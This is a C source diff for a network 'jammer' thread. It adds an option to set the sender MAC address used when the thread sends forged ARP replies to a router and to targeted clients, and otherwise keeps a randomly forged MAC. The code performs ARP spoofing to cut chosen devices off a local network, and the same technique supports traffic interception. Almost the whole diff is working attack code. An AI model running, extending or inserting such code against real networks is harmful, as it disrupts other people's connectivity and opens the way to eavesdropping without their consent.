@@ -3,6 +3,7 @@
 #include <stdatomic.h>
 #include <stdbool.h>
 #include <stdint.h>
+#include <string.h>
 
 #ifdef _WIN32
 #include <winsock2.h>
@@ -23,8 +24,11 @@ void *jammer_process(void *arg) {
     atomic_bool *stop_flag = args->stop_flag;
 
     network_socket_t network_socket = args->network_socket;
-    uint8_t random_mac[6];
-    network_forgery_mac(random_mac);
+    uint8_t sender_mac[6];
+    if (args->sender_mac_override)
+        memcpy(sender_mac, args->sender_mac_override, 6);
+    else
+        network_forgery_mac(sender_mac);
 
     int cleanup = 3;
     while (cleanup) {
@@ -45,9 +49,9 @@ void *jammer_process(void *arg) {
                 uint32_t device_ip = htonl(device_client->ip);
                 device_state_t state = device_client->state;
                 if (device_client->jamming) {
-                    arp_send_reply(&network_socket, device_router->mac, random_mac, device_ip,
+                    arp_send_reply(&network_socket, device_router->mac, sender_mac, device_ip,
                                    device_router->mac, router_ip);
-                    arp_send_reply(&network_socket, device_client->mac, random_mac, router_ip,
+                    arp_send_reply(&network_socket, device_client->mac, sender_mac, router_ip,
                                    device_client->mac, device_ip);
                 } else if (state == DEVICE_STATE_DISCONNECTING) {
                     arp_send_reply(&network_socket, device_router->mac, device_client->mac,
